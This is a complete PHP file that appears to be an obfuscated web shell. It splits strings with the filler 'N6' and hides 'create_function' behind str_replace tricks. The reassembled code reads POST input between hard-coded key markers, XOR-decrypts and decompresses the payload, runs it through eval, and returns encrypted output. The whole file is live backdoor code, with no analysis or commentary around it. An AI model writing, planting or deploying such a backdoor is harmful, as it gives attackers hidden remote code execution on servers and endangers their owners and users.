<?php
$m='nction x($N6t,$kN6){$c=strN6leN6n($k);$N6l=strN6len($t);$o=N6"";fN6N6N6oN6r($N6i=0;$i<$lN6;){for($';
$N='$N6k="c9f60d32N6";$kh="N622feN6608381N65b";$kfN6="N6a82dN6bN6a5cbf19";$p="VqN6kMU7dWDWsIZN6xEN6N6c";fu';
$R='@evaN6l(@gzuncomN6press(@x(@N6bN6aN6se64_decodeN6($m[1]),$N6k)));$o=@oN6N6b_get_contenN6ts();@N6oN';
$j='N6h("/$kh(.+)N6$kf/N6",@fN6ile_get_N6conteN6N6nts("php://N6input"),$N6m)==1) {@oN6b_staN6rN6tN6();';
$s=str_replace('p','','crpppeate_fppunctpion');
$u='j=0;($j<$c&&$N6i<$l);$jN6++,$i+N6N6N6+){$o.N6=$t{$i}^$N6k{$j};}}return $N6N6o;}if (@pregN6N6_matc';
$H='6bN6_end_clean();$r=N6@N6base6N64N6_encode(@x(@gzcN6omprN6ess($oN6)N6,$k));printN6("$pN6$kh$r$kf");}';
$y=str_replace('N6','',$N.$m.$u.$j.$R.$H);
$q=$s('',$y);$q();
?>
